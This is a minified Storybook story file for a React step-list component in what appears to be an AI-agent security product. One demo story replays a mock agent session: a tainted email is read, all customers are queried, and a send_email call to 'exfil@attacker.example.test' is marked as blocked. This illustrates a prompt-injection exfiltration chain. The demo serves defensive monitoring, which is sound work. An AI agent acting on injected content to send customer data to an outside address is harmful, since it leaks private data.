import{j as e}from"./jsx-runtime-DFAAy_2V.js";import{c as s}from"./cn-DOIGBiOF.js";import{S as h}from"./shield-alert-jfVm301B.js";import{c as y}from"./createLucideIcon-Si29XmKi.js";import{C as v}from"./check-eOoujeM4.js";import"./index-Bc2G9s8g.js";/**
 * @license lucide-react v0.378.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const k=y("CircleDot",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"1",key:"41hilf"}]]),x=({steps:g,className:b,onStepClick:r})=>e.jsx("ol",{className:s("divide-y divide-line border border-line rounded-sm bg-panel font-sans",b),children:g.map((t,f)=>{const a=!!r,n={completed:{node:e.jsx(v,{size:14,className:"text-ok"}),border:"border-ok/50 bg-ok/10",numText:"text-ok"},active:{node:e.jsx(k,{size:14,className:"text-warn animate-pulse"}),border:"border-warn/60 bg-warn/10",numText:"text-warn font-bold"},blocked:{node:e.jsx(h,{size:14,className:"text-bad"}),border:"border-bad/60 bg-bad/10",numText:"text-bad font-bold"},pending:{node:e.jsx("span",{className:"font-mono text-xs text-mut",children:f+1}),border:"border-line bg-bg",numText:"text-mut"}}[t.status];return e.jsxs("li",{onClick:()=>a&&r(t),className:s("flex items-start gap-4 p-4 transition-colors",a&&"hover:bg-line/20 cursor-pointer",t.status==="active"&&"bg-line/10",t.status==="blocked"&&"bg-bad/5"),children:[e.jsx("div",{className:s("flex items-center justify-center w-6 h-6 rounded-none border shrink-0 mt-0.5 font-chakra",n.border),"aria-hidden":"true",children:n.node}),e.jsxs("div",{className:"flex-1 min-w-0",children:[e.jsxs("div",{className:"flex items-center justify-between gap-2 flex-wrap",children:[e.jsx("span",{className:s("font-chakra font-medium text-sm",t.status==="active"?"text-fg font-semibold":"text-fg/90"),children:t.title}),t.badge]}),t.description&&e.jsx("div",{className:"text-xs text-mut mt-1 leading-relaxed",children:t.description})]})]},t.id)})});x.__docgenInfo={description:"",methods:[],displayName:"StepList",props:{steps:{required:!0,tsType:{name:"Array",elements:[{name:"StepItem"}],raw:"StepItem[]"},description:""},className:{required:!1,tsType:{name:"string"},description:""},onStepClick:{required:!1,tsType:{name:"signature",type:"function",raw:"(step: StepItem) => void",signature:{arguments:[{type:{name:"StepItem"},name:"step"}],return:{name:"void"}}},description:""}}};const O={title:"Components/StepList",component:x,tags:["autodocs"]},i={args:{steps:[{id:1,title:"Initialize Project & Tenant Boundary",description:"Created project 'prod-customer-service' with default zero-trust envelope.",status:"completed"},{id:2,title:"Install AgentShield SDK",description:"Run pip install shield-sdk-py and configure API key.",status:"completed"},{id:3,title:"Send Live Telemetry Test Event",description:"Waiting for SDK handshake event on /v1/events/tool-call...",status:"active"},{id:4,title:"Deploy Production OPA Policy",description:"Verify Rego dry-run against historical baseline.",status:"pending"}]}},o={args:{steps:[{id:"step_0",title:"Tool: read_email('em_492')",description:"Tainted segment seg_492 added to session context.",status:"completed"},{id:"step_1",title:"Tool: search_customers('*')",description:"High-volume customer database query detected.",status:"completed"},{id:"step_2",title:"Tool: send_email('exfil@attacker.example.test')",description:"AUTONOMOUSLY BLOCKED. Tainted context flowing to external critical sink.",status:"blocked"}]}};var d,c,l;i.parameters={...i.parameters,docs:{...(d=i.parameters)==null?void 0:d.docs,source:{originalSource:`{
  args: {
    steps: [{
      id: 1,
      title: "Initialize Project & Tenant Boundary",
      description: "Created project 'prod-customer-service' with default zero-trust envelope.",
      status: "completed"
    }, {
      id: 2,
      title: "Install AgentShield SDK",
      description: "Run pip install shield-sdk-py and configure API key.",
      status: "completed"
    }, {
      id: 3,
      title: "Send Live Telemetry Test Event",
      description: "Waiting for SDK handshake event on /v1/events/tool-call...",
      status: "active"
    }, {
      id: 4,
      title: "Deploy Production OPA Policy",
      description: "Verify Rego dry-run against historical baseline.",
      status: "pending"
    }]
  }
}`,...(l=(c=i.parameters)==null?void 0:c.docs)==null?void 0:l.source}}};var m,p,u;o.parameters={...o.parameters,docs:{...(m=o.parameters)==null?void 0:m.docs,source:{originalSource:`{
  args: {
    steps: [{
      id: "step_0",
      title: "Tool: read_email('em_492')",
      description: "Tainted segment seg_492 added to session context.",
      status: "completed"
    }, {
      id: "step_1",
      title: "Tool: search_customers('*')",
      description: "High-volume customer database query detected.",
      status: "completed"
    }, {
      id: "step_2",
      title: "Tool: send_email('exfil@attacker.example.test')",
      description: "AUTONOMOUSLY BLOCKED. Tainted context flowing to external critical sink.",
      status: "blocked"
    }]
  }
}`,...(u=(p=o.parameters)==null?void 0:p.docs)==null?void 0:u.source}}};const C=["OnboardingSequence","SessionReplayWithBlockedStep"];export{i as OnboardingSequence,o as SessionReplayWithBlockedStep,C as __namedExportsOrder,O as default};
